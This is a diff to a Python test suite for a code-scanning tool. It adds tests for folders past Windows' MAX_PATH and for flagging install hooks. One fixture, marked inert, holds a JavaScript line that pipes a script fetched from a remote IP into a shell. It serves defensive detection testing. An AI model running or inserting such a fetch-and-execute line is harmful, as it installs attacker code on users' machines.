@@ -652,6 +652,91 @@ class DirectoryWithoutAnAnchoredOpenTests(_DirectoryCase):
         self.assertEqual(sorted(i["file"] for i in out["issues"] if i["rule"] == "Q-SYMLINK"), ["link.py", "out"])
         self.assertNothingOutside()
 
+    def test_a_folder_past_max_path_is_truncated_where_the_system_will_not_take_its_path(self):
+        # (LZ-03's review of PR #17, L7: Windows without its long paths (LongPathsEnabled 0, its default) takes no plain
+        # path of 260 characters or more, and the tree is read by plain paths there: a folder past that is not read,
+        # SC-TRUNCATED at it, the result incomplete, as a folder nested too deep is. Where the system takes it (a
+        # runner with long paths, Linux), the walk reads it; that system is made one that will not here, refusing
+        # such a path as Win32 does, ERROR_PATH_NOT_FOUND)
+        inside, _outside = self.tree()
+        chain, at = [], inside
+        while len(at) < _MAX_PATH + 40:
+            chain.append("d" * 40)
+            at = os.path.join(at, chain[-1])
+            os.mkdir(_plain_or_extended(at))
+        with open(_plain_or_extended(os.path.join(at, "deep.js")), "wb") as fh:
+            fh.write(RISKY_JS.encode())
+        self.addCleanup(_remove_chain, inside, chain)
+        for limited in (False, True):
+            with self.subTest(max_path=limited):
+                self.reads.clear()
+                self.listed.clear()
+                with self.watching(), (_without_long_paths() if limited else contextlib.nullcontext()):
+                    out = server.tool_scan_directory({"path": inside, "max_issues": 500})
+                deep = os.path.join(*chain, "deep.js")
+                truncated = [i["file"] for i in out["issues"] if i["rule"] == "SC-TRUNCATED"]
+                if not limited and _takes_long_paths(at):
+                    self.assertFalse(out.get("incomplete"), out)
+                    self.assertEqual(truncated, [])
+                    self.assertIn(RISKY_JS.encode(), self.reads)
+                    continue
+                self.assertEqual(out["qualityGate"], "FAILED")
+                self.assertTrue(out.get("incomplete"), out)
+                self.assertEqual(len(truncated), 1, out["issues"])
+                self.assertTrue(deep == truncated[0] or deep.startswith(truncated[0] + os.sep), truncated)
+                self.assertGreater(len(os.path.join(inside, truncated[0])), _MAX_PATH - 50, truncated)
+                self.assertNotIn(RISKY_JS.encode(), self.reads)
+                self.assertNothingOutside()
+
+
+#: Win32's MAX_PATH: a plain path (not \\?\) of this many characters or more is not taken where long paths are off
+_MAX_PATH = 260
+
+
+def _plain_or_extended(path):
+    """`path` as it can be made whatever the system's long paths: on Windows, absolute with the extended-length prefix
+    (\\\\?\\); elsewhere as it is."""
+    if os.name != "nt":
+        return path
+    path = os.path.abspath(path)
+    return path if path.startswith("\\\\?\\") else "\\\\?\\" + path
+
+
+def _takes_long_paths(path):
+    try:
+        os.lstat(path)
+        return True
+    except OSError:
+        return False
+
+
+def _remove_chain(inside, chain):
+    """inside/<chain…>/deep.js and the chain's folders, removed by extended-length paths on Windows (shutil.rmtree's
+    plain ones may be too long there)."""
+    folders = [os.path.join(inside, *chain[:k]) for k in range(1, len(chain) + 1)]
+    with contextlib.suppress(OSError):
+        os.unlink(_plain_or_extended(os.path.join(folders[-1], "deep.js")))
+    for folder in reversed(folders):
+        with contextlib.suppress(OSError):
+            os.rmdir(_plain_or_extended(folder))
+
+
+@contextlib.contextmanager
+def _without_long_paths():
+    """The path calls the walk makes refuse a plain path of MAX_PATH characters or more (FileNotFoundError), as
+    Windows' do where long paths are off; an extended-length one (\\\\?\\) is taken."""
+    def refusing(real):
+        def call(path, *args, **kwargs):
+            if isinstance(path, str) and len(path) >= _MAX_PATH and not path.startswith("\\\\?\\"):
+                raise FileNotFoundError(2, "The system cannot find the path specified", path)
+            return real(path, *args, **kwargs)
+        return call
+    with contextlib.ExitStack() as stack:
+        for name in ("lstat", "stat", "open", "scandir", "readlink"):
+            stack.enter_context(mock.patch.object(os, name, refusing(getattr(os, name))))
+        stack.enter_context(mock.patch.object(lazaret, "_folder_final_path", refusing(lazaret._folder_final_path)))
+        yield
+
 
 # ---------------------------------------------------------------- LZ-03's review
 RISKY_JS = "require('child_process').execSync('curl -s https://198.51.100.7/p.sh | sh');\n"    # (inert: never run)
@@ -964,8 +1049,10 @@ class FoldingDiskTests(_SwapCase):
                         at = folder if how == "its folder for a link" else hook
                         if reaches:
                             self.assertNotRead(name, out, os.path.join(*at.split("/")))
-                        else:                   # (it names nothing, swapped or not: nothing outside is read)
-                            self.assertEqual(out["qualityGate"], "FAILED")
+                        else:                   # (it names nothing, swapped or not: nothing outside is read, and the
+                            self.assertEqual(out["qualityGate"], "FAILED")      # hook that runs a file not there
+                            if name == "scan_directory":                         # is MAJOR still)
+                                self.assertIn(("SC-INSTALL-HOOK", "MAJOR"), self.rules(out, "package.json"))
                             self.assertNothingOutside()
 
     def test_a_vendored_header_by_another_spelling_swapped_after_the_walk_is_not_read(self):
